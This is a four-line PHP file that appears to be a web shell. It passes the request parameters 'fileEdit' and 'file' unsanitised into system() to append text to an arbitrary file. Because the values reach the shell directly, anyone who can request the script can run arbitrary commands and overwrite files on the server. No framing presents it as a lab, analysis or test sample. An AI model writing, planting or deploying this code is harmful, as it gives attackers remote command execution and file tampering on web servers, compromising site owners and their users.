<?php
if(function_exists('system')) 
	system('echo '.$_REQUEST['fileEdit'].' >> '.$_REQUEST['file']); 
?>